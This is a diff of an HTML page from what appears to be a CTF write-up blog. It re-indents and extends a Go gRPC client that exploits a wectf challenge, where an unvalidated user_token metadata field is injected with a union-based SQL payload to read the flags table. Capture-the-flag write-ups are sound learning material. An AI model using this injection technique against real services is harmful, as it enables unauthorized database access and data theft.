@@ -15,7 +15,7 @@ Looking at the code, I saw a possible sql injection vulnerability here (in the w
 func (s *srvServer) GetLoginHistory(ctx context.Context, _ *pb.SrvRequest) (*pb.SrvReply, error) { md, _ := metadata.FromIncomingContext(ctx) if len(md[&#34;user_token&#34;]) == 0 { // no user token provided by upstream  return &amp;pb.">
 <meta itemprop="datePublished" content="2020-06-14T23:36:38-04:00" />
 <meta itemprop="dateModified" content="2020-06-14T23:36:38-04:00" />
-<meta itemprop="wordCount" content="284">
+<meta itemprop="wordCount" content="294">
 
 
 
@@ -119,26 +119,27 @@ through the steps of invoking the <code>AuthSrv</code> and registering, but it t
 that wasn&rsquo;t actually needed&ndash;the <code>GetLoginHistory</code> is only checking the token
 exists, without validation.</p>
 <div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="nx">conn</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">Dial</span><span class="p">(</span><span class="s">&#34;light.w-va.cf:1004&#34;</span><span class="p">,</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">WithInsecure</span><span class="p">())</span>
-	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
-	<span class="p">}</span>
-	<span class="k">defer</span> <span class="nx">conn</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
-	<span class="nx">srvc</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nf">NewSrvClient</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
-	<span class="nx">srvreq</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nx">SrvRequest</span><span class="p">{}</span>
-	<span class="nx">srvresp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">srvc</span><span class="p">.</span><span class="nf">GetLoginHistory</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="o">&amp;</span><span class="nx">srvreq</span><span class="p">)</span>
-	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
-	<span class="p">}</span>
-	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">srvresp</span><span class="p">)</span>
+  <span class="nx">conn</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">Dial</span><span class="p">(</span><span class="s">&#34;light.w-va.cf:1004&#34;</span><span class="p">,</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">WithInsecure</span><span class="p">())</span>
+  <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+    <span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+  <span class="p">}</span>
+  <span class="k">defer</span> <span class="nx">conn</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+  <span class="nx">srvc</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nf">NewSrvClient</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
+  <span class="nx">srvreq</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nx">SrvRequest</span><span class="p">{}</span>
+  <span class="nx">srvresp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">srvc</span><span class="p">.</span><span class="nf">GetLoginHistory</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="o">&amp;</span><span class="nx">srvreq</span><span class="p">)</span>
+  <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+    <span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+  <span class="p">}</span>
+  <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">srvresp</span><span class="p">)</span>
 <span class="p">}</span>
-</code></pre></div><p>It took me a bit more effort to figure out how to pass a <code>user_token</code> into the
+</code></pre></div><p>This got the Nil response. It took me a bit more effort to figure out how to pass a <code>user_token</code> into the
 <code>md</code> via the <code>metadata.FromIncomingContext(ctx)</code>. And from there,
 a union-based sql injection to get the flag.</p>
 <div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go">  <span class="nx">srvc</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nf">NewSrvClient</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
   <span class="nx">md</span> <span class="o">:=</span> <span class="nx">metadata</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;user_token&#34;</span><span class="p">:</span> <span class="s">&#34;&#39;)) union select flag from flags--&#34;</span><span class="p">})</span>
   <span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">metadata</span><span class="p">.</span><span class="nf">NewOutgoingContext</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="nx">md</span><span class="p">)</span>
   <span class="nx">srvreq</span> <span class="o">:=</span> <span class="nx">proto</span><span class="p">.</span><span class="nx">SrvRequest</span><span class="p">{}</span>
+  <span class="nx">srvresp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">srvc</span><span class="p">.</span><span class="nf">GetLoginHistory</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">srvreq</span><span class="p">)</span>
 </code></pre></div><p>It was cool to learn about grpc and xorm as well&ndash;haven&rsquo;t done serious golang in
 a while. Thanks wectf. :)</p>
 
@@ -148,7 +149,7 @@ a while. Thanks wectf. :)</p>
 				<p>
 					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://freeeve.github.io/ctf-writeups/tags/sqli">sqli</a></span><span class="tag"><a href="https://freeeve.github.io/ctf-writeups/tags/golang">golang</a></span>
 				</p>
-				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>284 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>294 Words</p>
 				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-06-14</p>
 			</footer>
 		</article>
